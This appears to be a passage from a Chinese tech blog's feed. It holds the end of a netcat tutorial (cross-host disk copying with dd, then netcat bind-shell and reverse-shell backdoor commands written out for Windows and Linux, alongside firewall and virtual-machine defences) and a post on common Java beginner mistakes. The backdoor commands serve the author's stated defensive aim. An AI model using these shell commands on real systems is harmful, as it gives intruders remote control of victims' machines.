一般来说，“系统管理员”和“入侵者”更看重第1个差异（性能）；而“数据取证人员”更看重第2个差异（完整性）。</p><h3 id="◇原理-1"><a href="#◇原理-1" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　为了传输整个磁盘，你需要用到 <code>dd</code> 命令。这玩意儿源自 UNIX，后来也移植到 Linux 和 Windows。<br>　　关于 <code>dd</code> 命令的更详细介绍，可以参见“维基百科”（<a href="https://en.wikipedia.org/wiki/Dd_(Unix)">这里</a>）或“Gnu 官网”（<a href="https://www.gnu.org/software/coreutils/dd">这里</a>）。</p><p>　　通过 <code>dd</code> 命令，你可以把“整个硬盘”（或者硬盘上的某个“物理分区”、“逻辑分区”）dump 成一个文件。<br>　　在本章节，由于最终目的是要【跨主机备份磁盘】，所以并【不】需要真的把 <code>dd</code> 命令的输出保存成文件，而是把 <code>dd</code> 的输出通过管道符（<code>|</code>）重定向给【本机】的 nc，然后让【本机】的 nc 发送到另一台主机的 nc（参见前一个招数）。</p><h3 id="◇方法-9"><a href="#◇方法-9" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　由于操作物理磁盘会涉及到操作系统的差异，下面俺以 Linux 举例。<br>　　假设你要把 A 主机 <code>/dev/sda</code> 磁盘的【原始数据】整个复制到 B 主机的 <code>/dev/sdb</code> 磁盘。</p><p>　　你先在【接收端】（B 主机）运行如下命令（其中的 <code>xxx</code> 是端口号）</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">nc -l -p xxx | dd of=<span class="hljs-regexp">/dev/</span>sdb<br></code></pre></td></tr></table></figure><p>　　然后在【发送端】（A 主机）运行如下命令。</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">dd <span class="hljs-keyword">if</span>=/dev/sda | nc <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xxx<br></code></pre></td></tr></table></figure><p>　　第二条命令中的 <code>xxx</code> 是端口号，要与第一条命令中的端口号相同；第二条命令中的 <code>x.x.x.x</code> 是【主机 B】的 IP 地址。</p><h3 id="◇补充说明：nc-的性能优势-1"><a href="#◇补充说明：nc-的性能优势-1" class="headerlink" title="◇补充说明：nc 的性能优势"></a>◇补充说明：nc 的性能优势</h3><p>　　如今的存储设备越来越大了。“磁盘”或者“分区”，动不动都是几百个 GB，这时候 nc 的【性能优势】就体现出来啦。<br>　　（具体的原因，前一个章节已经分析过了）</p><h2 id="★招数11：（入侵手法）用-nc-开启【被动】连接型后门"><a href="#★招数11：（入侵手法）用-nc-开启【被动】连接型后门" class="headerlink" title="★招数11：（入侵手法）用 nc 开启【被动】连接型后门"></a>★招数11：（入侵手法）用 nc 开启【被动】连接型后门</h2><p>　　既然聊 netcat，很自然地会聊到“黑客/骇客”的入侵招数。<br>　　做这方面的介绍，并【不是】为了传授入侵技巧；而是为了——让那些注重安全性的同学，能做到“知己知彼”。</p><h3 id="◇使用场景-10"><a href="#◇使用场景-10" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　假设1：你使用的浏览器存在某个安全漏洞，并且该漏洞会让攻击者获得【执行代码】的机会。<br>　　假设2：你在某个公共场合使用某个 wifi 热点上网。遗憾的是，这个热点是攻击者设置的陷阱。<br>　　假设3：设置该陷阱的攻击者，正好也知道：如何利用上述漏洞。<br>　　当这三个假设都成立，攻击者就可以获得在你【本机】执行代码的机会。这时候，攻击者可以下载一个 nc 到你本机，然后用 nc 开启一个【被动】连接型后门。所谓的“【被动】连接型”就是指——nc 开启对外监听端口。<br>　　在该场景中，因为攻击者与你处于【同一个局域网】，攻击者自然能从自己的机器访问到你本机的 nc 后门。</p><h3 id="◇原理-2"><a href="#◇原理-2" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　为了让后门能工作，通常会使用 nc 的 <code>-e</code> 选项，该选项的“选项值”是一个可执行文件的路径。<br>　　设置了该选项之后，当处于监听状态的 nc 接受到某个连接，会启动“选项值”对应的可执行文件（并得到某个进程），nc 会把该进程的“标准输入输出”与网络通讯【对接】。<br>　　为了让这个后门用起来足够爽，攻击者通常会让 nc 去启动一个【shell 进程】。对 Windows 系统而言，就是 <code>cmd.exe</code>；对 POSIX 系统（Linux or UNIX）而言，就是 <code>/bin/sh</code><br>　　在这种情况下（nc 挂载 shell），攻击者远程连入 nc 的端口，就可以直接在这个 shell 上进行各种操作，其效果类似于 SSH 或（老式的）telnet。</p><h3 id="◇入侵方法"><a href="#◇入侵方法" class="headerlink" title="◇入侵方法"></a>◇入侵方法</h3><p><strong>步骤1</strong><br>　　如果受害者是 Windows 系统，只须如下命令就可以开启一个后门（其中的 <code>xxx</code> 是端口号）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nc</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-l</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-tag">xxx</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure><p>　　如果受害者是 POSIX 系统（Linux or UNIX），则用如下命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -l -p xxx -e <span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><p><strong>步骤2</strong><br>　　后门创建好之后，攻击者在自己机器上也运行 nc（客户端 nc），然后连接到作为后门的 nc（服务端 nc）。一旦连上之后，攻击者就可以在自己的 nc 上看到对方（受害者机器）的 shell 提示符。</p><h3 id="◇补充说明：-e-选项"><a href="#◇补充说明：-e-选项" class="headerlink" title="◇补充说明：-e 选项"></a>◇补充说明：<code>-e</code> 选项</h3><p>　　据说是考虑到 <code>-e</code> 选项太过危险，nc 的 OpenBSD 变种（在多年前）已经【移除】了该选项。但其实捏，还是可以用间接的方式达到同样的效果（具体如何做，俺就不透露啦）。<br>　　另，“原版 nc”依然有这个选项；nc 的很多其它变种，也依然有这个选项。</p><h3 id="◇【不够】靠谱的防范措施"><a href="#◇【不够】靠谱的防范措施" class="headerlink" title="◇【不够】靠谱的防范措施"></a>◇【不够】靠谱的防范措施</h3><p>　　在这个场景中，大伙儿可能会想到三个值得改进之处：<br>1、浏览器的漏洞<br>2、使用公共 wifi 热点的习惯<br>3、防火墙的设置</p><p>　　对第1点<br>　　其实是【无解】滴！因为任何人都无法确保浏览器是【零漏洞】；</p><p>　　对第2点<br>　　要看每个人的具体情况而定。对有些人而言，“用公共热点上网”属于【刚需】。那就没办法了。</p><p>　　对第3点<br>　　“防火墙”这招，似乎是比较通用的解决之道。对大部分人而言，桌面 PC 根本就【不必】开启对外监听端口。因此，你可以配置操作系统自带防火墙，禁止【所有的】对外监听端口。<br>　　但是！（俺要开始说【但是】了）<br>　　操作系统自带的防火墙，本身也运行在操作系统【之内】。如果你是以【管理员身份】遭遇入侵，入侵者在进行【代码执行】的时候，就已经具有了【管理员权限】。在这个权限下，入侵者完全有可能“搞定”防火墙。方法有很多种——<br>比如说：把用作后门的端口号，悄悄加入到防火墙的白名单中；<br>再比如说：直接把防火墙的过滤模块干掉；<br>更牛逼的入侵者，甚至可以在【网卡驱动】上做文章——因为网卡驱动位于防火墙的过滤模块【之下】（比防火墙更底层）</p><h3 id="◇【靠谱】的防范措施——NAT-模式的虚拟机（Guest-OS）"><a href="#◇【靠谱】的防范措施——NAT-模式的虚拟机（Guest-OS）" class="headerlink" title="◇【靠谱】的防范措施——NAT 模式的虚拟机（Guest OS）"></a>◇【靠谱】的防范措施——NAT 模式的虚拟机（Guest OS）</h3><p>　　首先，这里所说的“NAT 模式”指的是【虚拟机的网卡模式】。如果你不熟悉虚拟机的网卡模式，建议先看俺写的《<a href="https://program-think.blogspot.com/2012/10/system-vm-0.html">扫盲操作系统虚拟机</a>》系列教程。</p><p>　　要想用这招，步骤如下：<br>1、当然先要安装【虚拟化软件】（VBox、VMware …），<br>2、安装一个虚拟的操作系统（洋文叫“Guest OS”）<br>3、虚拟系统的网卡设置为【NAT】模式</p><p>　　完成上述步骤后，你就可以在这个虚拟系统中上网。<br>　　NAT 的好处在于【单向可见】。也就是说，Guest OS 可以访问到物理系统（Host OS）【外部】的网络环境；但外部网络环境只能看到 Host OS，看不到 Guest OS。<br>　　在这种配置下，就算某个入侵者完全控制了你的 Guest OS，他/她也【没】办法在 Guest OS 中搭建“被动连接型后门”。换句话说，即使入侵者运行了这种后门，（但由于 NAT 的缘故）后门【无法】接受外部网络的连接，这个后门就【失去意义】啦。</p><h3 id="◇补充说明：“NAT-模式”如何搭配“系统防火墙”？"><a href="#◇补充说明：“NAT-模式”如何搭配“系统防火墙”？" class="headerlink" title="◇补充说明：“NAT 模式”如何搭配“系统防火墙”？"></a>◇补充说明：“NAT 模式”如何搭配“系统防火墙”？</h3><p>　　上述“NAT 招数”与“系统防火墙”并【不】矛盾。<br>　　也就是说，即使你用了这招，你的物理系统（Host OS）还是要配置系统防火墙，并禁止【所有的】对外监听端口。</p><h2 id="★招数12：（入侵手法）用-nc-开启【主动】连接型后门"><a href="#★招数12：（入侵手法）用-nc-开启【主动】连接型后门" class="headerlink" title="★招数12：（入侵手法）用 nc 开启【主动】连接型后门"></a>★招数12：（入侵手法）用 nc 开启【主动】连接型后门</h2><h3 id="◇使用场景-11"><a href="#◇使用场景-11" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　为了打字省力，继续用【前一个章节】的场景。差别在于，你采纳了前一章节的措施——在某个 NAT 模式的虚拟机（Gest OS）中上网，以对付【被动】连接型的 nc 后门。<br>　　可惜的是——即便如此，入侵者在利用漏洞并获得“执行代码”的机会之后，还是有办法用 nc 在你的电脑上搞一个网络后门。<br>　　虽然你用了 NAT 模式的【虚拟机】（Guest OS），但入侵者可以用 nc 创建一个【主动】连接型的网络后门（这种玩法，有时也称作“反向连接”的后门）。</p><h3 id="◇原理-3"><a href="#◇原理-3" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　原理其实与“招数11”很类似，唯一的差别在于——把客户端与服务端【对调】。也就是说，攻击者手头的 nc 充当服务端，而受害者机器上的 nc 充当客户端。此时，受害者本机的 nc【无须】开启监听端口，【不受】防火墙的影响，也【不受】NAT 的影响。</p><h3 id="◇入侵方法-1"><a href="#◇入侵方法-1" class="headerlink" title="◇入侵方法"></a>◇入侵方法</h3><p><strong>步骤1</strong><br>　　既然 nc 的“服务端”与“客户端”对调。因此攻击者要先在自己机器上运行“服务端 nc”，命令如下（其中的 <code>xxx</code> 是端口号）。当然啦，攻击者自己电脑的防火墙需要允许 <code>xxx</code> 端口号对外监听。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nc -lk -p xxx</span><br></code></pre></td></tr></table></figure><p><strong>步骤2</strong><br>　　如果受害者是 Windows 系统，只须如下命令就可以开启一个后门。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nc</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span> <span class="hljs-selector-tag">xxx</span><br></code></pre></td></tr></table></figure><p>　　如果受害者是 POSIX 系统，则用如下命令：</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -e /bin/sh <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xxx<br></code></pre></td></tr></table></figure><p>　　（在上述两个命令中， <code>xxx</code> 是步骤1用到的端口号，<code>x.x.x.x</code> 是攻击者的 IP 地址）</p><h3 id="◇比“NAT-模式”更保险的是——【隔离模式】的虚拟机"><a href="#◇比“NAT-模式”更保险的是——【隔离模式】的虚拟机" class="headerlink" title="◇比“NAT 模式”更保险的是——【隔离模式】的虚拟机"></a>◇比“NAT 模式”更保险的是——【隔离模式】的虚拟机</h3><p>　　所谓的【隔离模式】，指的是“Host Only 模式”或类似的模式（比如：“Internal 模式”）。<br>　　虽然当年那个系列讲的是【隐匿性】，但其中的【虚拟机隔离】，同样可以用来对付“主动连接型后门”。</p><p>　　有必要提醒一下：<br>　　【隔离的虚拟机】可以增加入侵者的攻击难度。但【不能】做到 100% 防范。<br>　　只要你能在某个隔离虚拟机中上网，那么——那些足够高级的木马，就【有可能】在隔离虚拟机中找到对外连接的通道。从而实现一个“【主动】连接型的后门”。<br>　　这下该咋办捏？<br>　　（在安全方面）虚拟机有两个【显著好处】——“网络隔离性”只是其中之一，另一个是【快照】。<br>　　如果你对安全性的要求【非常高】，要学会：<br>1、用“快照功能”建立【安全基线】<br>（所谓的【安全基线】就是说——在确保系统【纯洁】的时候，先做一个快照）<br>2、养成【定期回退快照】的好习惯<br>（就算你中了木马，只要一回退到【安全基线】，系统重新变得【纯洁】啦）</p><h3 id="◇“【主动】连接型后门”的优势之处（危险性之处）"><a href="#◇“【主动】连接型后门”的优势之处（危险性之处）" class="headerlink" title="◇“【主动】连接型后门”的优势之处（危险性之处）"></a>◇“【主动】连接型后门”的优势之处（危险性之处）</h3><p>　　简单对比一下“后门的两种连接方式”。</p><p><strong>可用性</strong><br>　　如果用“被动型后门”入侵桌面 PC，考虑到绝大部分桌面 PC 都处于内网（其网卡【并未】分配公网 IP）。对这种场景，攻击者需要与受害者在同一个局域网，才能与后门建立通讯。<br>　　相比之下，“主动型后门”就【没有】这种弊端。</p><p><strong>隐蔽性</strong><br>　　“被动型后门”需要显式开启监听端口，很容易引起用户的怀疑，或引起杀毒软件的注意。<br>　　相比之下，“主动型后门”就【没有】这个问题。</p><h2 id="★附录：netcat-的【其它变种】"><a href="#★附录：netcat-的【其它变种】" class="headerlink" title="★附录：netcat 的【其它变种】"></a>★附录：netcat 的【其它变种】</h2><p>　　本文开头部分已经介绍了“原版 nc”以及“OpenBSD 变种”。在结尾部分，简单聊聊其它几个变种。</p><h3 id="◇GNU-netcat"><a href="#◇GNU-netcat" class="headerlink" title="◇GNU netcat"></a>◇GNU netcat</h3><p>　　官网在“<a href="http://netcat.sourceforge.net/">这里</a>”。<br>　　从名称可以猜出：这是 GNU 社区对“原版 nc”的重写，以符合 GPL 许可协议。<br>　　按照它官网的说法，“GNU netcat”100% 兼容“原版 nc”的 1.10 版本。（注：1.10 版本是“原版 nc”用得最广的版本）</p><h3 id="◇ncat"><a href="#◇ncat" class="headerlink" title="◇ncat"></a>◇ncat</h3><p>　　这是 nmap 社区重写的 nc，其官网页面在“<a href="https://nmap.org/ncat/">这里</a>”，帮助页面在“<a href="https://nmap.org/ncat/guide/">这里</a>”。<br>　　它的口号是：Ncat - Netcat for the 21st Century<br>　　与“OpenBSD 变种”类似，它也增加了代理的支持。相比“OpenBSD 变种”，它的主要亮点是：完全支持 SSL/TLS。<br>　　由于它源自 nmap 社区，已经被包含在 nmap 软件包中（大多数 Linux ＆ BSD 发行版的官方仓库都有 nmap）</p><h3 id="◇socat"><a href="#◇socat" class="headerlink" title="◇socat"></a>◇socat</h3><p>　　在所有的变种里面，（据俺所知）这款可能是功能最强滴！但使用方法也有很大的不同（更复杂了）。感觉像是另一个全新的软件。<br>　　很多主流的 Linux 发行版已经包含它。<br>　　他也完全支持 SSL/TLS。</p><h3 id="◇Cryptcat"><a href="#◇Cryptcat" class="headerlink" title="◇Cryptcat"></a>◇Cryptcat</h3><p>　　一看名称就能猜到：这是“加密的网猫”。<br>　　由于大部分网猫都是直接在“裸 TCP”之上传输数据。如果传输的内容本身是明文，会遭遇【网络嗅探】的风险。<br>　　这款变种在传输过程中用 twofish 算法加密，以规避嗅探。</p><h3 id="◇sbd"><a href="#◇sbd" class="headerlink" title="◇sbd"></a>◇sbd</h3><p>　　光看这3字母的名称，你可能不知道这款变种的特色。<br>　　但如果俺告诉你：“sbd”是“Secure BackDoor”的缩写，你多半就猜到其特色了。<br>　　它的加密采用“AES-128-CBC + HMAC-SHA1”。</p><h3 id="◇netrw"><a href="#◇netrw" class="headerlink" title="◇netrw"></a>◇netrw</h3><p>　　这是专门针对“文件传输”功能进行强化和简化的变种。<br>　　【简化】方面<br>　　它分成两个命令：<code>netread</code> 和 <code>netwrite</code>，分别对应发送和接收。（相对“原版 nc”）省了几个命令选项。<br>　　【强化】方面<br>　　它会对传输过程进行散列校验，以防止传输的数据被篡改。</p>]]></content>
      
      
      <categories>
          
          <category> 编程随想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> programthink </tag>
            
            <tag> 小妙招 </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java新手的通病</title>
      <link href="/2021/07/16/java%E6%96%B0%E6%89%8B%E7%9A%84%E9%80%9A%E7%97%85/"/>
      <url>/2021/07/16/java%E6%96%B0%E6%89%8B%E7%9A%84%E9%80%9A%E7%97%85/</url>
      
        <content type="html"><![CDATA[<h1 id="数据结构和算法"><a href="#数据结构和算法" class="headerlink" title="数据结构和算法"></a>数据结构和算法</h1><p>为什么我先拿“数据结构和算法”说事捏？这玩意是写程序最最基本的东东。不管你使用 Java 还是其它的什么语言，都离不开它。而且这玩意是跨语言的，学好之后不管在哪门语言中都能用得上。</p><p>　　既然“数据结构和算法”这么重要，为什么很多 Java 新手却很不熟悉捏？我琢磨了一下，估计有两种可能。有些人虽然是计算机系毕业的，但是当初压根没好好学过这门课程，到工作时早都还给老师了；还有一些人是中途转行干编程，转行后又没有好好地打基础（都指望速成）。<br>　　下面我列出几个很基本的问题，如果你每一个问题都搞得很清楚，那说明你过了这关，可以去看看下一个帖子了。否则的话，你赶紧去找本算法和数据结构的书恶补一下吧。</p><p>★什么时候该用数组型容器、什么时候该用链表型容器？<br>★什么是散列函数？HashMap 的实现原理是什么？<br>★什么是递归？如果你以前从来没写过递归函数，尝试着写一个（比如用递归函数进行目录树遍历）。<br>★什么是算法复杂度？<br>★你是否理解空间换时间的思想？<br>★写一个针对整数数组的冒泡排序函数，看看你要修改几次才能跑通。<br>★写一个针对整数数组的二分查找函数，看看你要修改几次才能跑通。</p><h1 id="缺乏面向对象基本功"><a href="#缺乏面向对象基本功" class="headerlink" title="缺乏面向对象基本功"></a>缺乏面向对象基本功</h1><p>按理说 Java 是一个很 OO 的语言，Java 社区也一向是充满了“对象”的氛围。但俺在面试 Java 程序员时，却屡屡碰到令人大跌眼镜的事情。俺碰到不止一个求职者，连什么是“多态”都讲不清楚。很多人号称用过设计模式，但一半以上都仅限于单键模式和抽象工厂模式。当我深入问他/她抽象工厂模式到底有什么好处时，很多人语焉不详。</p><p>　　为什么很多 Java 程序员会缺乏面向对象基本功？这得怪那些 Java 框架。现在 Java 的各种框架太发达、太傻瓜化了，导致很多程序员只需要按部就班、照着框架进行代码填空，基本已经丧失了 OOA 和 OOD 的能力。我手下有些个 Java 程序员，对 Spring、Hibernate 等框架了如指掌；但如果给他一个简单需求，让他写一个脱离 Web 框架的独立 Application，他就不知所措了。这样的开发人员，将来只能成为所谓的“软件蓝领”，岗位很难得到提升。</p><p>　　同上文一样，我这次也提如下几个问题：<br>★基于接口的继承和基于实现的继承各有什么优缺点？<br>★继承（包括 extend 和 implement）有什么【缺点】？<br>★多态（polymorphism）有什么【缺点】？<br>★为什么 Java 可以多继承 interface，而不可以多继承 class？<br>★假如让你写一个小游戏（比如人机对战的五子棋），你会如何设计类结构？<br>★类结构设计时，如何考虑可扩展性？</p><p>　　如果上述这些问题你都能够搞得比较清楚，说明你的 OO 基础还过得去。否则的话，我建议你一边找些 <a href="https://en.wikipedia.org/wiki/Object-oriented_analysis_and_design">OOAD</a> 和设计模式的书看看，同时自己动手写些简单的小程序（不依赖那些框架），把学到的模式理论结合到实践中。通过这种方式来提高自己 OOAD 的能力，效果会比较好。</p><h1 id="编程习惯"><a href="#编程习惯" class="headerlink" title="编程习惯"></a>编程习惯</h1><p>　上次聊了“缺乏面向对象基本功”，今天来说说编程习惯的问题。今天说的这些坏习惯大部分都是跨语言的（C++、Python 新手也有），而且大部分都需要靠平时不断地努力才能慢慢改掉。</p><h2 id="★随意地命名"><a href="#★随意地命名" class="headerlink" title="★随意地命名"></a>★随意地命名</h2><p>　　有些新手写程序，当需要定义某个变量名（也可能是函数名、类名、包名等）时，随意地一敲键盘，名字就起好了……若干星期后，碰到某 bug，再来看自己写的代码时，心中暗自嘀咕：“这代码是我写的吗？咋都看不懂捏？”<br>　　所以我常跟新来的菜鸟说，命名不规范害死人啊！鉴于该问题相当普遍，我整理了几种典型的作为反面教材，具体如下：使用单字母命名变量；使用一些没太大意义的变量名（例如 s1、s2、s3）；对同一个业务概念使用不同的术语/缩写（容易让读代码的人神经分裂）；使用拼音命名（如果你团队中有港台人士或者老外，就惨了）。</p><h2 id="★习惯于代码的-copy-amp-paste"><a href="#★习惯于代码的-copy-amp-paste" class="headerlink" title="★习惯于代码的 copy &amp; paste"></a>★习惯于代码的 copy &amp; paste</h2><p>　　这是一个很普遍的问题。很多新手写代码的时候，如果发现要写的某个函数和前几天写的某个函数差不多，就把原来的那个函数贴过来，然后稍微改几下，心中还暗喜：“又快速搞定了一个功能”……<br>　　同学，如果你也喜欢这么干，可要注意了。这种做法是代码臭味（借用《重构 - 改善既有代码的设计》的提法）的主要来源，导致代码可维护性大大下降。当你将来需要增加功能或修改 bug 的时候，要同时改动多个地方，而那时你估计已经想不起来这砣代码有几个克隆了。</p><h2 id="★Magic-Number-满天飞"><a href="#★Magic-Number-满天飞" class="headerlink" title="★Magic Number 满天飞"></a>★Magic Number 满天飞</h2><p>　　如果你没有听说过“Magic Number”，先看“<a href="https://en.wikipedia.org/wiki/Magic_number_(programming)#Unnamed_numerical_constant">这里</a>”了解一下。<br>为了说明Magic Number的问题，咱找个例子来说事儿：假设有个业务逻辑中需要进行10秒的超时等待，你会怎么写这个sleep语句？我估计大部分人不外乎下面三种写法：<br>1、直接写上 <code>sleep(10*1000);</code> 了事<br>2、定义一个常量 <code>TIMEOUT_XXX = 10*1000;</code> 然后 <code>sleep(TIMEOUT_XXX);</code><br>3、在配制文件中加入一个超时项，然后程序读取配制文件获得超时值，然后调用 sleep。（此处提到的“配置文件”是广义的，泛指各种可用于存储配置信息的机制，如：xml 文件、ini 文件、数据库 …）<br>　　如果你的做法类似于写法1，你多半喜欢随手硬编码。硬编码不光缺乏可读性，而且具有和“代码拷贝粘贴”类似的代码臭味（可能会存在多个 Magic Number 克隆），不利于日后维护。<br>　　至于写法2，比写法1稍好（至少可读性好了）。但是，将来一旦发生需求变更，要求在【运行时】调整超时间隔（甚至要求让用户来配制超时间隔），则写法2的缺点立马暴露无遗。</p><h2 id="★代码耦合度太大"><a href="#★代码耦合度太大" class="headerlink" title="★代码耦合度太大"></a>★代码耦合度太大</h2><p>　　每当说到 MVC 或者设计模式，几乎每个 Java 开发人员都能说得头头是道？但是说归说，真正写代码的时候，鲜有人写出的代码是层次清楚的。至于说到代码耦合分别由哪些情况引起？什么是正交的设计？（关于耦合与正交设计，我后面会专门讨论一下）能完全搞明白的人就更少了。<br>　　所以很多 Java 新手的代码耦合度大也就不足为奇了。我曾经抽查过试用期员工的代码，各种业务逻辑纠缠在一起，代码臭味都要熏死人。想重构都无从下手，只好让他推倒重写。</p><h2 id="★被-GC-宠坏"><a href="#★被-GC-宠坏" class="headerlink" title="★被 GC 宠坏"></a>★被 GC 宠坏</h2><p>　　由于 Java 在语言层面提供了内存的垃圾回收机制，程序员只管申请内存，不需要再关心释放的问题。因此很多新手养成了坏习惯，对于其它资源（比如数据库连接）也只申请不释放（有些人甚至天真地以为 JVM 会帮你搞定资源回收）。<br>　　还有些人虽然知道资源需要释放，但是常常忘记（比如写了打开数据库连接和相关代码，【即将】写关闭数据库连接时，突然有人叫你去吃中饭，回来后就把这茬给忘了）。<br>　　这个坏习惯会导致资源的泄露，而资源泄露往往比内存泄露更要命。如果你写的程序是长时间运行的（比如运行在 Web Server 上），时间长了会由于资源耗尽而导致整个进程出问题。</p><h1 id="异常处理不当"><a href="#异常处理不当" class="headerlink" title="异常处理不当"></a>异常处理不当</h1><p>上文讨论了“编程习惯的问题”，今天来聊聊关于异常处理的话题。</p><h2 id="★空的-catch-语句块"><a href="#★空的-catch-语句块" class="headerlink" title="★空的 catch 语句块"></a>★空的 catch 语句块</h2><p>　　犯这种错误的人比较少，一般发生在刚学会 Java 或者刚参加工作不久的人身上。<br>　　所谓“空 catch 语句块”就是在 catch 语句块中没有对异常作任何处理（比如记错误日志），导致异常信息被丢弃/忽略。一旦程序不能正确运行，由于查不到任何 log 信息，只好从头看代码，靠肉眼找 bug。</p><h2 id="★没有使用-finally"><a href="#★没有使用-finally" class="headerlink" title="★没有使用 finally"></a>★没有使用 finally</h2><p>　　很多人在 catch 语句之后不使用 finally 语句。由于在 try 语句中可能会涉及资源的申请和释放。如果在资源申请之后、资源释放之前抛出异常，就会发生资源泄露。<br>　　（资源泄露的严重性，上文已经聊过了）</p><h2 id="★笼统的-catch-语句块"><a href="#★笼统的-catch-语句块" class="headerlink" title="★笼统的 catch 语句块"></a>★笼统的 catch 语句块</h2><p>　　有些人为了省事，只在自己模块的最外层代码包一个 try 语句块，然后 catch(Exception)。不管捕获到什么异常，都作统一 log 了事。这种做法比“空 catch 语句块”稍好，但由于不能对具体的异常进行具体处理，对一些可恢复的异常（下面会提到），丧失了恢复的机会。而且也可能导致上述提到的资源泄露的问题。</p><h2 id="★使用函数返回值进行错误处理"><a href="#★使用函数返回值进行错误处理" class="headerlink" title="★使用函数返回值进行错误处理"></a>★使用函数返回值进行错误处理</h2><p>　　有些人放着 Java 的异常机制不用，而用函数返回值来表示成功/失败（比如：返回 true 表示成功、false 表示失败），简直是“捧着金碗要饭”。个人感觉，从 C 转到 Java 的人比较容易有此毛病。这种做法会导致如下几个问题：<br>\1. 返回值一般用整数值或布尔值表示，传递的信息过于简陋；<br>\2. 一旦调用者忽略了错误返回码，就会导致和“空 catch 语句块”类似的问题；<br>\2. 对同一个函数的多处调用，都需要对返回值进行重复判断，导致代码冗余（代码冗余的坏处，上文也已经聊过了）。</p><h2 id="★不清楚“Checked-Exception”和“Runtime-Exception”的区别"><a href="#★不清楚“Checked-Exception”和“Runtime-Exception”的区别" class="headerlink" title="★不清楚“Checked Exception”和“Runtime Exception”的区别"></a>★不清楚“Checked Exception”和“Runtime Exception”的区别</h2><p>　　这个现象比较普遍，俺发现很多2年以上 Java 工作经验的人尚未完全搞明白两者的区别。看来这个问题得详细说一下。<br>当初Java的设计者有意区分这两种异常，是别有深意的。其中“Checked Exception”用于表示可恢复的异常（也就是你必须检查的异常）；而“Runtime Exception”表示不可恢复的异常（也就是运行时异常，主要是程序 bug 和致命错误，你【不需要】检查）。不过这种做法引来了很多争议（包括很多 Java 大牛），鉴于本帖子主要针对新手，以后再专门来聊这个争议的话题。<br>　　为了便于理解，下面我举一个例子来说明。假设你要写一个 Download 函数，根据传入的 URL（String 参数）返回对应网页的内容文本。这时候有两种情况你需要处理：<br>\1. 如果传入的 URL 参数是 null，这表明该函数的调用者出 bug 了，而程序本身的 bug 是很难在运行时自我恢复的。这时候 Download 函数必须抛出 Runtime Exception。并且 Download 函数的调用者【不应该】尝试去处理这个异常，必须让它【尽早】暴露出来（比如让 JVM 自己终止运行）。<br>\2. 如果传入的 URL 参数非 null，但是它包含的字符串不是一个合法的URL格式（可能由于用户输入错误导致）。这时候 Download 函数必须抛出 Checked Exception。并且 Download 函数的调用者必须捕获该异常并进行相应的处理（比如提示用户重新输入 URL）。</p><p>上面就是几种常见的Java异常处理的误用。下一次我们来聊一下“对虚拟机（JVM）了解不足”。</p><h1 id="对JVM缺乏了解"><a href="#对JVM缺乏了解" class="headerlink" title="对JVM缺乏了解"></a>对JVM缺乏了解</h1><p>上文讨论了Java异常机制的几种误用，今天咱们来说说 JVM（以及 Java 编译器）相关的话题。为啥要聊 JVM 捏？因为有很多 Java 程序员，由于对 JVM 缺乏了解，在碰到某些技术问题时无从下手；另外，由于缺乏对 JVM 的了解，可能导致写出来的代码性能巨差或者有严重的 Bug。对于一个 Java 程序员来说，你不一定要非常清楚 JVM 的细节，但是对于一些关键的运作机制，还是要掌握大致的概念。<br>　　按照本系列的惯例，俺会问几个和 JVM 相关的问题，你如果对这些问题不是很明白，那得考虑花点时间去了解一下了。另外，鉴于有网友批评“<a href="https://program-think.blogspot.com/2009/01/defect-of-java-beginner-0-overview.html">本系列</a>”帖子：光诊断毛病，不开出药方。（说得很形象，也很中肯）俺会针对下面提出的问题，写一些帖子来解答。</p><h2 id="★关于基本类型和引用类型"><a href="#★关于基本类型和引用类型" class="headerlink" title="★关于基本类型和引用类型"></a>★关于基本类型和引用类型</h2><p>很多新手不理解Java的基本类型和引用类型在本质上有什么区别。请看如下的问题：<br>◇这两种类型在内存存储上有什么区别？<br>◇这两种类型在性能上有什么区别？<br>◇这两种类型对于 GC 有什么区别？</p><h2 id="★关于垃圾回收（Garbage-Collection）"><a href="#★关于垃圾回收（Garbage-Collection）" class="headerlink" title="★关于垃圾回收（Garbage Collection）"></a>★关于垃圾回收（Garbage Collection）</h2><p>　　很多新手不理解 GC 的实现机制。请看如下的问题：<br>◇GC 是如何判断哪些对象已经失效？<br>◇GC 